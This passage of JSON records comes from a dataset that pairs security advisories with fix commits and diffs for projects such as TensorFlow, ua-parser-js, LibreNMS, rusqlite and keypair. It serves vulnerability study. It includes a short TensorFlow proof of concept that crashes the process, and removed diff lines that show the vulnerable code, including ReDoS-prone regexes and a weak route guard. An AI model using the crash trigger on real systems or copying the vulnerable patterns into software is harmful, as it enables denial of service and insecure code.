= \\'%s?%s\\' % (url, urlencode(kwargs))\\n         return Page.count_for_url(url)\\n@@ -638,7 +638,7 @@ def _update(self):\\n         return self.put(self._url)\\n \\n     def _create(self):\\n-        url = urljoin(recurly.base_uri(), self.collection_path)\\n+        url = recurly.base_uri() + self.collection_path\\n         return self.post(url)\\n \\n     def put(self, url):'}}","message_norm":"fix ssrf: do not use urljoin, quote uuids","language":"fr","entities":"[('fix', 'ACTION', ''), ('ssrf', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['recurly\/resource.py'])","num_files":1.0},{"index":227,"vuln_id":"GHSA-393f-2jr3-cp69","cwe_id":"{'CWE-754'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b432a38fe0e1b4b904a6c222cbce794c39703e87'}","dataset":"osv","summary":"CHECK-fail in DrawBoundingBoxes ### Impact\nAn attacker can trigger a denial of service via a `CHECK` failure by passing an empty image to `tf.raw_ops.DrawBoundingBoxes`:\n\n```python\nimport tensorflow as tf\n\nimages = tf.fill([53, 0, 48, 1], 0.)\nboxes = tf.fill([53, 31, 4], 0.)\nboxes = tf.Variable(boxes)\nboxes[0, 0, 0].assign(3.90621)\ntf.raw_ops.DrawBoundingBoxes(images=images, boxes=boxes)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/ea34a18dc3f5c8d80a40ccca1404f343b5d55f91\/tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc#L148-L165) uses `CHECK_*` assertions instead of `OP_REQUIRES` to validate user controlled inputs. Whereas `OP_REQUIRES` allows returning an error condition back to the user, the `CHECK_*` macros result in a crash if the condition is false, similar to `assert`.\n\n```cc\nconst int64 max_box_row_clamp = std::min<int64>(max_box_row, height - 1);\n... \nCHECK_GE(max_box_row_clamp, 0);\n``` \n    \nIn this case, `height` is 0 from the `images` input. This results in `max_box_row_clamp` being negative and the assertion being falsified, followed by aborting program execution.\n    \n### Patches\nWe have patched the issue in GitHub commit [b432a38fe0e1b4b904a6c222cbce794c39703e87](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b432a38fe0e1b4b904a6c222cbce794c39703e87).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b432a38fe0e1b4b904a6c222cbce794c39703e87","commit_sha":"b432a38fe0e1b4b904a6c222cbce794c39703e87","patch":"SINGLE","chain_ord":"['b432a38fe0e1b4b904a6c222cbce794c39703e87']","before_first_fix_commit":"{'ea34a18dc3f5c8d80a40ccca1404f343b5d55f91'}","last_fix_commit":"b432a38fe0e1b4b904a6c222cbce794c39703e87","chain_ord_pos":1.0,"commit_datetime":"04\/21\/2021, 22:57:36","message":"Fix overflow CHECK issue with `tf.raw_ops.DrawBoundingBoxes`.\n\nPiperOrigin-RevId: 369753591\nChange-Id: I3b45fc98ee0d28a3c20b7e9c995aa647c976ec40","author":"Amit Patankar","comments":null,"stats":"{'additions': 36, 'deletions': 12, 'total': 48}","files":"{'tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc': {'additions': 36, 'deletions': 12, 'changes': 48, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b432a38fe0e1b4b904a6c222cbce794c39703e87\/tensorflow%2Fcore%2Fkernels%2Fimage%2Fdraw_bounding_box_op.cc', 'patch': '@@ -147,22 +147,46 @@ class DrawBoundingBoxesOp : public OpKernel {\\n \\n         \/\/ At this point, {min,max}_box_{row,col}_clamp are inside the\\n         \/\/ image.\\n-        CHECK_GE(min_box_row_clamp, 0);\\n-        CHECK_GE(max_box_row_clamp, 0);\\n-        CHECK_LT(min_box_row_clamp, height);\\n-        CHECK_LT(max_box_row_clamp, height);\\n-        CHECK_GE(min_box_col_clamp, 0);\\n-        CHECK_GE(max_box_col_clamp, 0);\\n-        CHECK_LT(min_box_col_clamp, width);\\n-        CHECK_LT(max_box_col_clamp, width);\\n+        OP_REQUIRES(\\n+            context, min_box_row_clamp >= 0,\\n+            errors::InvalidArgument(\"Min box row clamp is less than 0.\"));\\n+        OP_REQUIRES(\\n+            context, max_box_row_clamp >= 0,\\n+            errors::InvalidArgument(\"Max box row clamp is less than 0.\"));\\n+        OP_REQUIRES(context, min_box_row_clamp <= height,\\n+                    errors::InvalidArgument(\\n+                        \"Min box row clamp is greater than height.\"));\\n+        OP_REQUIRES(context, max_box_row_clamp <= height,\\n+                    errors::InvalidArgument(\\n+                        \"Max box row clamp is greater than height.\"));\\n+\\n+        OP_REQUIRES(\\n+            context, min_box_col_clamp >= 0,\\n+            errors::InvalidArgument(\"Min box col clamp is less than 0.\"));\\n+        OP_REQUIRES(\\n+            context, max_box_col_clamp >= 0,\\n+            errors::InvalidArgument(\"Max box col clamp is less than 0.\"));\\n+        OP_REQUIRES(context, min_box_col_clamp <= width,\\n+                    errors::InvalidArgument(\\n+                        \"Min box col clamp is greater than width.\"));\\n+        OP_REQUIRES(context, max_box_col_clamp <= width,\\n+                    errors::InvalidArgument(\\n+                        \"Max box col clamp is greater than width.\"));\\n \\n         \/\/ At this point, the min_box_row and min_box_col are either\\n         \/\/ in the image or above\/left of it, and max_box_row and\\n         \/\/ max_box_col are either in the image or below\/right or it.\\n-        CHECK_LT(min_box_row, height);\\n-        CHECK_GE(max_box_row, 0);\\n-        CHECK_LT(min_box_col, width);\\n-        CHECK_GE(max_box_col, 0);\\n+\\n+        OP_REQUIRES(\\n+            context, min_box_row <= height,\\n+            errors::InvalidArgument(\"Min box row is greater than height.\"));\\n+        OP_REQUIRES(context, max_box_row >= 0,\\n+                    errors::InvalidArgument(\"Max box row is less than 0.\"));\\n+        OP_REQUIRES(\\n+            context, min_box_col <= width,\\n+            errors::InvalidArgument(\"Min box col is greater than width.\"));\\n+        OP_REQUIRES(context, max_box_col >= 0,\\n+                    errors::InvalidArgument(\"Max box col is less than 0.\"));\\n \\n         \/\/ Draw top line.\\n         if (min_box_row >= 0) {'}}","message_norm":"fix overflow check issue with `tf.raw_ops.drawboundingboxes`.\n\npiperorigin-revid: 369753591\nchange-id: i3b45fc98ee0d28a3c20b7e9c995aa647c976ec40","language":"en","entities":"[('fix', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('issue', 'FLAW', ''), ('369753591', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc'])","num_files":1.0},{"index":229,"vuln_id":"GHSA-394c-5j6w-4xmx","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/faisalman\/ua-parser-js\/commit\/6d1f26df051ba681463ef109d36c9cf0f7e32b18'}","dataset":"osv","summary":"Regular Expression Denial of Service (ReDoS) in ua-parser-js The package ua-parser-js before 0.7.23 are vulnerable to Regular Expression Denial of Service (ReDoS) in multiple regexes (see linked commit for more info).","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/faisalman\/ua-parser-js","commit_href":"https:\/\/github.com\/faisalman\/ua-parser-js\/commit\/6d1f26df051ba681463ef109d36c9cf0f7e32b18","commit_sha":"6d1f26df051ba681463ef109d36c9cf0f7e32b18","patch":"SINGLE","chain_ord":"['6d1f26df051ba681463ef109d36c9cf0f7e32b18']","before_first_fix_commit":"{'86471ad7e24724757e6147cd449cc2af4fab6280'}","last_fix_commit":"6d1f26df051ba681463ef109d36c9cf0f7e32b18","chain_ord_pos":1.0,"commit_datetime":"11\/30\/2020, 17:50:19","message":"Fix ReDoS vulnerabilities reported by Snyk","author":"Faisal Salman","comments":null,"stats":"{'additions': 14, 'deletions': 14, 'total': 28}","files":"{'src\/ua-parser.js': {'additions': 14, 'deletions': 14, 'changes': 28, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/faisalman\/ua-parser-js\/raw\/6d1f26df051ba681463ef109d36c9cf0f7e32b18\/src%2Fua-parser.js', 'patch': \"@@ -222,7 +222,7 @@\\n \\n             \/\/ Presto based\\n             \/(opera\\\\smini)\\\\\/([\\\\w\\\\.-]+)\/i,                                       \/\/ Opera Mini\\n-            \/(opera\\\\s[mobiletab]+).+version\\\\\/([\\\\w\\\\.-]+)\/i,                      \/\/ Opera Mobi\/Tablet\\n+            \/(opera\\\\s[mobiletab]{3,6}).+version\\\\\/([\\\\w\\\\.-]+)\/i,                  \/\/ Opera Mobi\/Tablet\\n             \/(opera).+version\\\\\/([\\\\w\\\\.]+)\/i,                                     \/\/ Opera > 9.80\\n             \/(opera)[\\\\\/\\\\s]+([\\\\w\\\\.]+)\/i                                          \/\/ Opera < 9.80\\n             ], [NAME, VERSION], [\\n@@ -252,7 +252,7 @@\\n             \/(konqueror)\\\\\/([\\\\w\\\\.]+)\/i                                           \/\/ Konqueror\\n             ], [[NAME, 'Konqueror'], VERSION], [\\n \\n-            \/(trident).+rv[:\\\\s]([\\\\w\\\\.]+).+like\\\\sgecko\/i                         \/\/ IE11\\n+            \/(trident).+rv[:\\\\s]([\\\\w\\\\.]{1,9}).+like\\\\sgecko\/i                     \/\/ IE11\\n             ], [[NAME, 'IE'], VERSION], [\\n \\n             \/(edge|edgios|edga|edg)\\\\\/((\\\\d+)?[\\\\w\\\\.]+)\/i                          \/\/ Microsoft Edge\\n@@ -362,13 +362,13 @@\\n             \/fxios\\\\\/([\\\\w\\\\.-]+)\/i                                                \/\/ Firefox for iOS\\n             ], [VERSION, [NAME, 'Firefox']], [\\n \\n-            \/version\\\\\/([\\\\w\\\\.]+).+?mobile\\\\\/\\\\w+\\\\s(safari)\/i                       \/\/ Mobile Safari\\n+            \/version\\\\\/([\\\\w\\\\.]+)\\\\s.*mobile\\\\\/\\\\w+\\\\s(safari)\/i                      \/\/ Mobile Safari\\n             ], [VERSION, [NAME, 'Mobile Safari']], [\\n \\n-            \/version\\\\\/([\\\\w\\\\.]+).+?(mobile\\\\s?safari|safari)\/i                    \/\/ Safari & Safari Mobile\\n+            \/version\\\\\/([\\\\w\\\\.]+)\\\\s.*(mobile\\\\s?safari|safari)\/i                   \/\/ Safari & Safari Mobile\\n             ], [VERSION, NAME], [\\n \\n-            \/webkit.+?(gsa)\\\\\/([\\\\w\\\\.]+).+?(mobile\\\\s?safari|safari)(\\\\\/[\\\\w\\\\.]+)\/i  \/\/ Google Search Appliance on iOS\\n+            \/webkit.+?(gsa)\\\\\/([\\\\w\\\\.]+)\\\\s.*(mobile\\\\s?safari|safari)(\\\\\/[\\\\w\\\\.]+)\/i \/\/ Google Search Appliance on iOS\\n             ], [[NAME, 'GSA'], VERSION], [\\n \\n             \/webkit.+?(mobile\\\\s?safari|safari)(\\\\\/[\\\\w\\\\.]+)\/i                     \/\/ Safari < 3.0\\n@@ -387,7 +387,7 @@\\n \\n                                                                                 \/\/ Firefox\/SeaMonkey\/K-Meleon\/IceCat\/IceApe\/Firebird\/Phoenix\\n             \/(firefox)\\\\\/([\\\\w\\\\.]+)\\\\s[\\\\w\\\\s\\\\-]+\\\\\/[\\\\w\\\\.]+$\/i,                       \/\/ Other Firefox-based\\n-            \/(mozilla)\\\\\/([\\\\w\\\\.]+).+rv\\\\:.+gecko\\\\\/\\\\d+\/i,                          \/\/ Mozilla\\n+            \/(mozilla)\\\\\/([\\\\w\\\\.]+)\\\\s.+rv\\\\:.+gecko\\\\\/\\\\d+\/i,                        \/\/ Mozilla\\n \\n             \/\/ Other\\n             \/(polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf|sleipnir)[\\\\\/\\\\s]?([\\\\w\\\\.]+)\/i,\\n@@ -487,7 +487,7 @@\\n             \/(sprint\\\\s(\\\\w+))\/i                                                  \/\/ Sprint Phones\\n             ], [[VENDOR, mapper.str, maps.device.sprint.vendor], [MODEL, mapper.str, maps.device.sprint.model], [TYPE, MOBILE]], [\\n \\n-            \/(htc)[;_\\\\s-]+([\\\\w\\\\s]+(?=\\\\)|\\\\sbuild)|\\\\w+)\/i,                        \/\/ HTC\\n+            \/(htc)[;_\\\\s-]{1,2}([\\\\w\\\\s]+(?=\\\\)|\\\\sbuild)|\\\\w+)\/i,                    \/\/ HTC\\n             \/(zte)-(\\\\w*)\/i,                                                     \/\/ ZTE\\n             \/(alcatel|geeksphone|nexian|panasonic|(?=;\\\\s)sony)[_\\\\s-]?([\\\\w-]*)\/i\\n                                                                                 \/\/ Alcatel\/GeeksPhone\/Nexian\/Panasonic\/Sony\\n@@ -591,13 +591,13 @@\\n             ], [MODEL, [VENDOR, 'Google'], [TYPE, MOBILE]], [\\n \\n             \/android.+;\\\\s(\\\\w+)\\\\s+build\\\\\/hm\\\\1\/i,                                 \/\/ Xiaomi Hongmi 'numeric' models\\n-            \/android.+(hm[\\\\s\\\\-_]*note?[\\\\s_]*(?:\\\\d\\\\w)?)\\\\s+build\/i,               \/\/ Xiaomi Hongmi\\n-            \/android.+(redmi[\\\\s\\\\-_]*(?:note|k)?(?:[\\\\s_]?[\\\\w\\\\s]+))(?:\\\\s+build|\\\\))\/i,      \\n+            \/android.+(hm[\\\\s\\\\-_]?note?[\\\\s_]?(?:\\\\d\\\\w)?)\\\\sbuild\/i,                \/\/ Xiaomi Hongmi\\n+            \/android.+(redmi[\\\\s\\\\-_]?(?:note|k)?(?:[\\\\s_]?[\\\\w\\\\s]+))(?:\\\\sbuild|\\\\))\/i,      \\n                                                                                 \/\/ Xiaomi Redmi\\n-            \/android.+(mi[\\\\s\\\\-_]*(?:a\\\\d|one|one[\\\\s_]plus|note lte)?[\\\\s_]?(?:\\\\d?\\\\w?)[\\\\s_]*(?:plus)?)\\\\s+build\/i    \\n+            \/android.+(mi[\\\\s\\\\-_]?(?:a\\\\d|one|one[\\\\s_]plus|note lte)?[\\\\s_]?(?:\\\\d?\\\\w?)[\\\\s_]?(?:plus)?)\\\\sbuild\/i    \\n                                                                                 \/\/ Xiaomi Mi\\n             ], [[MODEL, \/_\/g, ' '], [VENDOR, 'Xiaomi'], [TYPE, MOBILE]], [\\n-            \/android.+(mi[\\\\s\\\\-_]*(?:pad)(?:[\\\\s_]?[\\\\w\\\\s]+))(?:\\\\s+build|\\\\))\/i     \/\/ Mi Pad tablets\\n+            \/android.+(mi[\\\\s\\\\-_]?(?:pad)(?:[\\\\s_]?[\\\\w\\\\s]+))(?:\\\\sbuild|\\\\))\/i     \/\/ Mi Pad tablets\\n             ],[[MODEL, \/_\/g, ' '], [VENDOR, 'Xiaomi'], [TYPE, TABLET]], [\\n             \/android.+;\\\\s(m[1-5]\\\\snote)\\\\sbuild\/i                                \/\/ Meizu\\n             ], [MODEL, [VENDOR, 'Meizu'], [TYPE, MOBILE]], [\\n@@ -611,7 +611,7 @@\\n             \/android.+[;\\\\\/]\\\\s*(RCT[\\\\d\\\\w]+)\\\\s+build\/i                            \/\/ RCA Tablets\\n             ], [MODEL, [VENDOR, 'RCA'], [TYPE, TABLET]], [\\n \\n-            \/android.+[;\\\\\/\\\\s]+(Venue[\\\\d\\\\s]{2,7})\\\\s+build\/i                      \/\/ Dell Venue Tablets\\n+            \/android.+[;\\\\\/\\\\s](Venue[\\\\d\\\\s]{2,7})\\\\s+build\/i                       \/\/ Dell Venue Tablets\\n             ], [MODEL, [VENDOR, 'Dell'], [TYPE, TABLET]], [\\n \\n             \/android.+[;\\\\\/]\\\\s*(Q[T|M][\\\\d\\\\w]+)\\\\s+build\/i                         \/\/ Verizon Tablet\\n@@ -669,8 +669,8 @@\\n             \/android.+[;\\\\\/]\\\\s*TU_(1491)\\\\s+build\/i                               \/\/ Rotor Tablets\\n             ], [MODEL, [VENDOR, 'Rotor'], [TYPE, TABLET]], [\\n \\n-            \/android.+(KS(.+))\\\\s+build\/i                                        \/\/ Amazon Kindle Tablets\\n-            ], [MODEL, [VENDOR, 'Amazon'], [TYPE, TABLET]], [\\n+            \/\/android.+(KS(.+))\\\\s+build\/i                                        \/\/ Amazon Kindle Tablets\\n+            \/\/], [MODEL, [VENDOR, 'Amazon'], [TYPE, TABLET]], [\\n \\n             \/android.+(Gigaset)[\\\\s\\\\-]+(Q\\\\w{1,9})\\\\s+build\/i                      \/\/ Gigaset Tablets\\n             ], [VENDOR, MODEL, [TYPE, TABLET]], [\"}}","message_norm":"fix redos vulnerabilities reported by snyk","language":"en","entities":"[('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('vulnerabilities', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/ua-parser.js'])","num_files":1.0},{"index":231,"vuln_id":"GHSA-39q4-p535-c852","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/locutusjs\/locutus\/commit\/eb863321990e7e5514aa14f68b8d9978ece9e65e'}","dataset":"osv","summary":"Uncontrolled Resource Consumption in locutus The package locutus before 2.0.15 are vulnerable to Regular Expression Denial of Service (ReDoS) via the gopher_parsedir function.","published_date":"2021-06-10","chain_len":1,"project":"https:\/\/github.com\/locutusjs\/locutus","commit_href":"https:\/\/github.com\/locutusjs\/locutus\/commit\/eb863321990e7e5514aa14f68b8d9978ece9e65e","commit_sha":"eb863321990e7e5514aa14f68b8d9978ece9e65e","patch":"SINGLE","chain_ord":"['eb863321990e7e5514aa14f68b8d9978ece9e65e']","before_first_fix_commit":"{'243b723896c3c82f5496b6008f9aa1be52741899'}","last_fix_commit":"eb863321990e7e5514aa14f68b8d9978ece9e65e","chain_ord_pos":1.0,"commit_datetime":"05\/27\/2021, 06:46:30","message":"Prevent ReDos issue with regex inside gopher_parsedir (#446)","author":"Rafa\u0142 Kukawski","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/php\/net-gopher\/gopher_parsedir.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/locutusjs\/locutus\/raw\/eb863321990e7e5514aa14f68b8d9978ece9e65e\/src%2Fphp%2Fnet-gopher%2Fgopher_parsedir.js', 'patch': '@@ -22,7 +22,7 @@ module.exports = function gopher_parsedir (dirent) { \/\/ eslint-disable-line came\\n    * s = Audio file format, primarily a WAV file\\n    *\/\\n \\n-  const entryPattern = \/^(.)(.*?)\\\\t(.*?)\\\\t(.*?)\\\\t(.*?)\\\\u000d\\\\u000a$\/\\n+  const entryPattern = \/^(.)([^\\\\t]*)\\\\t([^\\\\t]*)\\\\t([^\\\\t]*)\\\\t([^\\\\t]*)\\\\r\\\\n$\/\\n   const entry = dirent.match(entryPattern)\\n \\n   if (entry === null) {'}}","message_norm":"prevent redos issue with regex inside gopher_parsedir (#446)","language":"en","entities":"[('prevent', 'ACTION', ''), ('redos', 'SECWORD', ''), ('issue', 'FLAW', ''), ('#446', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/php\/net-gopher\/gopher_parsedir.js'])","num_files":1.0},{"index":234,"vuln_id":"GHSA-3c33-3465-fhx2","cwe_id":"{'CWE-668'}","score":8.8,"chain":"{'https:\/\/github.com\/librenms\/librenms\/commit\/e5bb6d80bc308fc56b9a01ffb76c34159995353c'}","dataset":"osv","summary":"Exposure of Resource to Wrong Sphere in LibreNMS An issue was discovered in LibreNMS before 1.65.1. It has insufficient access control for normal users because of \"'guard' => 'admin'\" instead of \"'middleware' => ['can:admin']\" in routes\/web.php.","published_date":"2021-09-08","chain_len":1,"project":"https:\/\/github.com\/librenms\/librenms","commit_href":"https:\/\/github.com\/librenms\/librenms\/commit\/e5bb6d80bc308fc56b9a01ffb76c34159995353c","commit_sha":"e5bb6d80bc308fc56b9a01ffb76c34159995353c","patch":"SINGLE","chain_ord":"['e5bb6d80bc308fc56b9a01ffb76c34159995353c']","before_first_fix_commit":"{'a30fcbde0a0f8a2109cbd4edb2b27b118190b3ca'}","last_fix_commit":"e5bb6d80bc308fc56b9a01ffb76c34159995353c","chain_ord_pos":1.0,"commit_datetime":"07\/08\/2020, 23:04:48","message":"Fix settings access (#11915)\n\nnormal users could access","author":"Tony Murray","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'routes\/web.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/librenms\/librenms\/raw\/e5bb6d80bc308fc56b9a01ffb76c34159995353c\/routes%2Fweb.php', 'patch': \"@@ -43,7 +43,7 @@\\n     });\\n \\n     \/\/ admin pages\\n-    Route::group(['guard' => 'admin'], function () {\\n+    Route::group(['middleware' => ['can:admin']], function () {\\n         Route::get('settings\/{tab?}\/{section?}', 'SettingsController@index')->name('settings');\\n         Route::put('settings\/{name}', 'SettingsController@update')->name('settings.update');\\n         Route::delete('settings\/{name}', 'SettingsController@destroy')->name('settings.destroy');\"}}","message_norm":"fix settings access (#11915)\n\nnormal users could access","language":"en","entities":"[('fix', 'ACTION', ''), ('#11915', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['routes\/web.php'])","num_files":1.0},{"index":239,"vuln_id":"GHSA-3cgf-9m6x-pwwr","cwe_id":"{'CWE-362'}","score":9.8,"chain":"{'https:\/\/github.com\/rusqlite\/rusqlite\/commit\/45fd77ee43c38eea4d6f4e2e56c1667a55ec654f'}","dataset":"osv","summary":"Data races in rusqlite An issue was discovered in the rusqlite crate before 0.23.0 for Rust. Memory safety can be violated via UnlockNotification.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/rusqlite\/rusqlite","commit_href":"https:\/\/github.com\/rusqlite\/rusqlite\/commit\/45fd77ee43c38eea4d6f4e2e56c1667a55ec654f","commit_sha":"45fd77ee43c38eea4d6f4e2e56c1667a55ec654f","patch":"SINGLE","chain_ord":"['45fd77ee43c38eea4d6f4e2e56c1667a55ec654f']","before_first_fix_commit":"{'c9ef5bd63cad5c0c123344c072b490a1a9bcbe1f'}","last_fix_commit":"45fd77ee43c38eea4d6f4e2e56c1667a55ec654f","chain_ord_pos":1.0,"commit_datetime":"04\/15\/2020, 19:05:31","message":"UnlockNotification should hold mutex when calling condvar","author":"Thom Chiovoloni","comments":null,"stats":"{'additions': 9, 'deletions': 11, 'total': 20}","files":"{'src\/unlock_notify.rs': {'additions': 9, 'deletions': 11, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rusqlite\/rusqlite\/raw\/45fd77ee43c38eea4d6f4e2e56c1667a55ec654f\/src%2Funlock_notify.rs', 'patch': '@@ -26,12 +26,13 @@ impl UnlockNotification {\\n         }\\n     }\\n \\n-    fn fired(&mut self) {\\n-        *self.mutex.lock().unwrap() = true;\\n+    fn fired(&self) {\\n+        let mut flag = self.mutex.lock().unwrap();\\n+        *flag = true;\\n         self.cond.notify_one();\\n     }\\n \\n-    fn wait(&mut self) {\\n+    fn wait(&self) {\\n         let mut fired = self.mutex.lock().unwrap();\\n         while !*fired {\\n             fired = self.cond.wait(fired).unwrap();\\n@@ -43,12 +44,9 @@ impl UnlockNotification {\\n #[cfg(feature = \"unlock_notify\")]\\n unsafe extern \"C\" fn unlock_notify_cb(ap_arg: *mut *mut c_void, n_arg: c_int) {\\n     use std::slice::from_raw_parts;\\n-    let args = from_raw_parts(ap_arg, n_arg as usize);\\n-    for arg in args {\\n-        let _ = catch_unwind(|| {\\n-            let un: &mut UnlockNotification = &mut *(*arg as *mut UnlockNotification);\\n-            un.fired()\\n-        });\\n+    let args = from_raw_parts(ap_arg as *const &UnlockNotification, n_arg as usize);\\n+    for un in args {\\n+        let _ = catch_unwind(std::panic::AssertUnwindSafe(|| un.fired()));\\n     }\\n }\\n \\n@@ -73,12 +71,12 @@ pub unsafe fn is_locked(db: *mut ffi::sqlite3, rc: c_int) -> bool {\\n \/\/\/ back the current transaction (if any).\\n #[cfg(feature = \"unlock_notify\")]\\n pub unsafe fn wait_for_unlock_notify(db: *mut ffi::sqlite3) -> c_int {\\n-    let mut un = UnlockNotification::new();\\n+    let un = UnlockNotification::new();\\n     \/* Register for an unlock-notify callback. *\/\\n     let rc = ffi::sqlite3_unlock_notify(\\n         db,\\n         Some(unlock_notify_cb),\\n-        &mut un as *mut UnlockNotification as *mut c_void,\\n+        &un as *const UnlockNotification as *mut c_void,\\n     );\\n     debug_assert!(\\n         rc == ffi::SQLITE_LOCKED || rc == ffi::SQLITE_LOCKED_SHAREDCACHE || rc == ffi::SQLITE_OK'}}","message_norm":"unlocknotification should hold mutex when calling condvar","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/unlock_notify.rs'])","num_files":1.0},{"index":243,"vuln_id":"GHSA-3f8r-4qwm-r7jf","cwe_id":"{'CWE-287'}","score":9.8,"chain":"{'https:\/\/github.com\/apache\/trafficcontrol\/commit\/f780aff77a52d52a37b4d1cc3e8e801c0b557356'}","dataset":"osv","summary":"Improper Authentication in Apache Traffic Control Improper authentication is possible in Apache Traffic Control versions 3.0.0 and 3.0.1 if LDAP is enabled for login in the Traffic Ops API component. Given a username for a user that can be authenticated via LDAP, it is possible to improperly authenticate as that user without that user's correct password.","published_date":"2021-05-18","chain_len":1,"project":"https:\/\/github.com\/apache\/trafficcontrol","commit_href":"https:\/\/github.com\/apache\/trafficcontrol\/commit\/f780aff77a52d52a37b4d1cc3e8e801c0b557356","commit_sha":"f780aff77a52d52a37b4d1cc3e8e801c0b557356","patch":"SINGLE","chain_ord":"['f780aff77a52d52a37b4d1cc3e8e801c0b557356']","before_first_fix_commit":"{'85596a08bb12835370895ba20455e5ce998278d1'}","last_fix_commit":"f780aff77a52d52a37b4d1cc3e8e801c0b557356","chain_ord_pos":1.0,"commit_datetime":"08\/30\/2019, 20:40:48","message":"Improve ldap error handling","author":"Rawlin Peters","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'traffic_ops\/traffic_ops_golang\/login\/login.go': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/trafficcontrol\/raw\/f780aff77a52d52a37b4d1cc3e8e801c0b557356\/traffic_ops%2Ftraffic_ops_golang%2Flogin%2Flogin.go', 'patch': '@@ -51,6 +51,10 @@ func LoginHandler(db *sqlx.DB, cfg config.Config) http.HandlerFunc {\\n \\t\\t\\thandleErrs(http.StatusBadRequest, err)\\n \\t\\t\\treturn\\n \\t\\t}\\n+\\t\\tif form.Username == \"\" || form.Password == \"\" {\\n+\\t\\t\\tapi.HandleErr(w, r, nil, http.StatusBadRequest, errors.New(\"username and password are required\"), nil)\\n+\\t\\t\\treturn\\n+\\t\\t}\\n \\t\\tresp := struct {\\n \\t\\t\\ttc.Alerts\\n \\t\\t}{}'}}","message_norm":"improve ldap error handling","language":"da","entities":"[('improve', 'ACTION', ''), ('ldap', 'SECWORD', ''), ('error handling', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['traffic_ops\/traffic_ops_golang\/login\/login.go'])","num_files":1.0},{"index":244,"vuln_id":"GHSA-3f99-hvg4-qjwj","cwe_id":"{'CWE-335'}","score":8.7,"chain":"{'https:\/\/github.com\/juliangruber\/keypair\/commit\/9596418d3363d3e757676c0b6a8f2d35a9d1cb18'}","dataset":"osv","summary":"Insecure random number generation in keypair ## Description and Impact\n\nA bug in the pseudo-random number generator used by [keypair](https:\/\/github.com\/juliangruber\/keypair) versions up to and including 1.0.3 could allow for weak RSA key generation. This could enable an attacker to decrypt confidential messages or gain authorized access to an account belonging to the victim. We recommend replacing any RSA keys that were generated using keypair version 1.0.3 or earlier.\n\n## Fix\n\n* The [bug](https:\/\/github.com\/juliangruber\/keypair\/blob\/87c62f255baa12c1ec4f98a91600f82af80be6db\/index.js#L1008) in the pseudo-random number generator is fixed in commit [`9596418`](https:\/\/github.com\/juliangruber\/keypair\/commit\/9596418d3363d3e757676c0b6a8f2d35a9d1cb18).\n* If the crypto module is available, it is used instead of the pseudo-random number generator. Also fixed in [`9596418`](https:\/\/github.com\/juliangruber\/keypair\/commit\/9596418d3363d3e757676c0b6a8f2d35a9d1cb18)\n\n## Additional Details\n\nThe specific [line](https:\/\/github.com\/juliangruber\/keypair\/blob\/87c62f255baa12c1ec4f98a91600f82af80be6db\/index.js#L1008) with the flaw is:\n\n```javascript\nb.putByte(String.fromCharCode(next & 0xFF))\n```\n\nThe [definition](https:\/\/github.com\/juliangruber\/keypair\/blob\/87c62f255baa12c1ec4f98a91600f82af80be6db\/index.js#L350-L352) of `putByte` is \n\n```javascript\nutil.ByteBuffer.prototype.putByte = function(b) {\n  this.data += String.fromCharCode(b);\n};\n```\n\nSimplified, this is `String.fromCharCode(String.fromCharCode(next & 0xFF))`. This results in most of the buffer containing zeros. An example generated buffer:\n\n(Note: truncated for 